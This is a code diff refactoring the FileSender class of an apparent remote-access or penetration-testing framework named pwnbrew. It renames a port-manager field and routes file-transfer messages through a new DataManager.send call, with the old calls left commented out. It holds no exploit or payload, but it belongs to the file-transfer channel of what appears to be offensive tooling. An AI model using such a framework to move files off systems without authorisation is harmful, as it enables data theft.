@@ -55,6 +55,7 @@ import java.util.logging.Level;
 import pwnbrew.ClientConfig;
 import pwnbrew.concurrent.LockListener;
 import pwnbrew.log.RemoteLog;
+import pwnbrew.manager.DataManager;
 import pwnbrew.manager.PortManager;
 import pwnbrew.utilities.Constants;
 import pwnbrew.utilities.DebugPrinter;
@@ -74,7 +75,7 @@ import pwnbrew.network.control.messages.PushFileAck;
  */
 public class FileSender extends ManagedRunnable implements LockListener {
 
-    private final PortManager theCommManager;
+    private final PortManager thePortManager;
     private final PushFileAck theFileAck;
     
 //    protected static final int CONNECT_RETRY = 3;
@@ -95,7 +96,7 @@ public class FileSender extends ManagedRunnable implements LockListener {
     @SuppressWarnings("ucd")
     public FileSender( PortManager passedExecutor, PushFileAck passedAck ) {
         super( Constants.Executor);
-        theCommManager = passedExecutor;
+        thePortManager = passedExecutor;
         theFileAck = passedAck;
         channelId = theFileAck.getFileChannelId();
     }   
@@ -107,7 +108,7 @@ public class FileSender extends ManagedRunnable implements LockListener {
         ClientConfig theConf = ClientConfig.getConfig();
         int socketPort = theConf.getSocketPort();
 //        String serverIp = theConf.getServerIp();
-        ClientPortRouter aPR = (ClientPortRouter) theCommManager.getPortRouter( socketPort );
+        ClientPortRouter aPR = (ClientPortRouter) thePortManager.getPortRouter( socketPort );
 
         //Initiate the file transfer
         if(aPR != null){
@@ -140,7 +141,8 @@ public class FileSender extends ManagedRunnable implements LockListener {
                     if( aCMManager != null ){
                         //Send message to cleanup the file transfer on the client side
                         PushFileAbort fileAbortMsg = new PushFileAbort( channelId, fileId );
-                        aCMManager.send(fileAbortMsg);
+                        DataManager.send(thePortManager, fileAbortMsg);
+//                        aCMManager.send(fileAbortMsg);
                     }
 
                 }
@@ -175,7 +177,8 @@ public class FileSender extends ManagedRunnable implements LockListener {
             fileDataMsg.setDestHostId(dstHostId);
             
             //Send the message
-            thePR.queueSend( fileDataMsg.getBytes(), dstHostId );
+            DataManager.send(thePortManager, fileDataMsg);
+//            thePR.queueSend( fileDataMsg.getBytes(), dstHostId );
             
         } else {  
         
@@ -215,7 +218,8 @@ public class FileSender extends ManagedRunnable implements LockListener {
                     fileDataMsg.setChannelId(channelId);
                     fileDataMsg.setDestHostId(dstHostId);
                     
-                    thePR.queueSend( fileDataMsg.getBytes(), channelId );
+                    DataManager.send(thePortManager, fileDataMsg);
+//                    thePR.queueSend( fileDataMsg.getBytes(), channelId );
 
                 }
 
